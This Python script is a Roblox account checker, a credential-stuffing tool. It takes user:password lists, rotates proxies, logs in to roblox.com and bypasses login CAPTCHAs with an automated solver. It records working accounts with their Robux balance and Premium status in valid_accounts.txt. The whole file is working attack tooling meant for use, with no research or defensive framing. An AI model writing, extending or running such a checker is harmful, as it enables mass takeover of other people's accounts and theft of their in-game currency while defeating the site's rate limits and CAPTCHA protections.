import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich.table import Table
from rich.text import Text

# Import local modules
from session import RobloxSession
from custom_solver import AdvancedCaptchaSolver
from local_solver import cleanup_solver
from util import load_proxies, load_accounts, get_config

console = Console()
config = get_config()

# --- Global Statistics ---
stats = {
    "total": 0,
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "captcha_solved": 0,
    "errors": 0
}
stats_lock = threading.Lock()

# Recent Activity Log
activity_log = []
log_lock = threading.Lock()
MAX_LOG_ENTRIES = 6

def add_log(message, style="white"):
    with log_lock:
        timestamp = time.strftime("%H:%M:%S")
        entry = Text(f"[{timestamp}] {message}", style=style)
        activity_log.insert(0, entry)
        if len(activity_log) > MAX_LOG_ENTRIES:
            activity_log.pop()

def update_stats(status):
    with stats_lock:
        stats["checked"] += 1
        if status == "valid":
            stats["valid"] += 1
        elif status == "invalid":
            stats["invalid"] += 1
        elif status == "captcha":
            # Captcha solved = valid account
            stats["valid"] += 1
            stats["captcha_solved"] += 1
        else:
            stats["errors"] += 1

def check_account_task(account_line, proxy_dict):
    """Worker function"""
    try:
        if ':' not in account_line:
            with stats_lock:
                stats["invalid"] += 1
                stats["checked"] += 1
            add_log(f"❌ Invalid format: {account_line[:20]}...", "red")
            return

        parts = account_line.strip().split(':', 1)
        if len(parts) != 2:
            with stats_lock:
                stats["invalid"] += 1
                stats["checked"] += 1
            add_log(f"❌ Invalid format: {account_line[:20]}...", "red")
            return
            
        username = parts[0]
        password = parts[1]
        
        session = RobloxSession(proxy=proxy_dict)
        session.url = "https://www.roblox.com/login"
        session.username = username
        session.password = password

        login_result = session.login(username, password)
        status = login_result.get('status')

        if status == 'success':
            # Direct success without captcha
            info = session.get_account_info()
            robux = info.get("robux", 0)
            premium = info.get("premium", False)
            
            with stats_lock:
                stats["valid"] += 1
                stats["checked"] += 1
            
            result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
            with open("valid_accounts.txt", "a", encoding="utf-8") as f:
                f.write(result_line + "\n")
            
            add_log(f"✅ {username}: Logged in successfully | Robux: {robux}", "green")
            return
            
        elif status == 'invalid':
            with stats_lock:
                stats["invalid"] += 1
                stats["checked"] += 1
            add_log(f"❌ {username}: Invalid credentials", "red")
            return
            
        elif status == 'banned':
            with stats_lock:
                stats["errors"] += 1
                stats["checked"] += 1
            add_log(f"🔒 {username}: Banned or locked", "red")
            return
            
        elif status == 'captcha':
            add_log(f"⚡ Captcha detected for {username}...", "yellow")
            csrf = login_result.get('csrf')
            if not csrf:
                stats["errors"] += 1
                stats["checked"] += 1
                add_log(f"⚠️ Captcha detected but no CSRF token for {username}", "red")
                return

            solver = AdvancedCaptchaSolver(headless=True, debug=True)
            console.print(f"[yellow]   ⚡ Starting captcha solver for {username}...[/yellow]")
            
            solve_result = session.solve_captcha_and_retry(
                username,
                password,
                csrf,
                lambda u, p, t: solver.solve(u, p, t)
            )
            
            console.print(f"[dim]   Solve result: {solve_result}[/dim]")
            console.print(f"[dim]   Session logged_in: {session.is_logged_in}[/dim]")

            # Check for success - either direct success or VISUAL_SUCCESS means valid
            if solve_result.get('status') == 'success' or (solve_result.get('status') != 'invalid' and session.is_logged_in):
                # Get Info for captcha-solved accounts
                info = session.get_account_info()
                robux = info.get("robux", 0)
                premium = info.get("premium", False)
                
                with stats_lock:
                    stats["valid"] += 1
                    stats["checked"] += 1
                
                # Save
                result_line = f"{account_line.strip()} | Robux: {robux} | Premium: {premium}"
                with open("valid_accounts.txt", "a", encoding="utf-8") as f:
                    f.write(result_line + "\n")
                
                msg = f"✅ {username} | Robux: {robux}"
                add_log(msg, "green")
                console.print(f"[green]   ✅ {username} validated with {robux} Robux![/green]")
                return
            elif solve_result.get('status') == 'invalid':
                with stats_lock:
                    stats["invalid"] += 1
                    stats["checked"] += 1
                add_log(f"❌ {username}: Invalid credentials (post-captcha)", "red")
                return
            else:
                with stats_lock:
                    stats["errors"] += 1
                    stats["checked"] += 1
                add_log(f"❌ {username}: Captcha failed - {solve_result.get('message', 'unknown')}", "red")
                return
        else:
            with stats_lock:
                stats["errors"] += 1
                stats["checked"] += 1
            add_log(f"⚠️ Error ({status}): {username}", "red")
            return

    except Exception as e:
        with stats_lock:
            stats["errors"] += 1
            stats["checked"] += 1
        error_msg = str(e)[:40]
        if "greenlet" not in error_msg.lower() and "thread" not in error_msg.lower():
            add_log(f"❌ Error: {error_msg}", "red")

def create_layout():
    layout = Layout()
    layout.split(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="footer", size=10)
    )
    return layout

def main():
    console.print("[bold blue]🚀 Starting Roblox Checker with Custom CV Solver...[/bold blue]")
    
    accounts = load_accounts("accounts.txt")
    proxies = load_proxies("proxies.txt")
    
    if not accounts:
        console.print("[red]❌ No accounts found! Create 'accounts.txt' (user:pass).[/red]")
        return
    
    if not proxies:
        console.print("[yellow]⚠️ No proxies found. Running without proxies.[/yellow]")
        proxy_list = [None] * len(accounts)
    else:
        proxy_list = (proxies * (len(accounts) // len(proxies) + 1))[:len(accounts)]
    
    threads = config.get("threads", 3)
    console.print(f"[green]⚙️ Loaded {len(accounts)} accounts, {len(proxies)} proxies. Using {threads} threads.[/green]")
    time.sleep(2)

    layout = create_layout()
    
    # Initialize Progress Bar explicitly
    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        MofNCompleteColumn(),
        TextColumn("• [green]{task.completed}/{task.total}[/green]"),
        expand=False
    )
    task_id = progress.add_task("Checking Accounts...", total=len(accounts))
    
    # Put progress in body initially
    layout["body"].update(progress)

    try:
        with Live(layout, refresh_per_second=4, screen=False) as live:
            # Set Header
            layout["header"].update(Panel(
                "[bold white on blue] Roblox Account Checker v3.0 [/bold white on blue]\nCustom OpenCV Captcha Solver Active", 
                style="bold white on blue"
            ))
            
            def make_footer():
                with stats_lock:
                    stats_text = (
                        f"[green]Valid:[/green] {stats['valid']}  "
                        f"[red]Invalid:[/red] {stats['invalid']}  "
                        f"[yellow]Captcha:[/yellow] {stats['captcha_solved']}  "
                        f"[magenta]Errors:[/magenta] {stats['errors']}"
                    )
                    
                    log_table = Table(show_header=False, box=None, padding=(0, 1))
                    with log_lock:
                        for entry in activity_log:
                            log_table.add_row(entry)
                    
                    # Build the panel content properly
                    panel_content = f"{stats_text}\n"
                    for row in activity_log:
                        panel_content += f"{row.plain if hasattr(row, 'plain') else str(row)}\n"
                    
                    return Panel(
                        panel_content,
                        title="📊 Statistics & Activity",
                        border_style="green"
                    )

            layout["footer"].update(make_footer())
            live.refresh()

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(check_account_task, acc, prox): acc 
                    for acc, prox in zip(accounts, proxy_list)
                }
                
                for future in as_completed(futures):
                    progress.advance(task_id)
                    # Automatic refresh at 4 refreshes/sec handles UI updates 

        console.print("\n[bold green]✅ Complete! Check 'valid_accounts.txt'[/bold green]")
        
    except KeyboardInterrupt:
        console.print("\n[red]⛔ Stopped.[/red]")
    except Exception as e:
        console.print(f"\n[red]💥 Crash: {e}[/red]")
        import traceback
        traceback.print_exc()
    finally:
        cleanup_solver()

if __name__ == "__main__":
    main()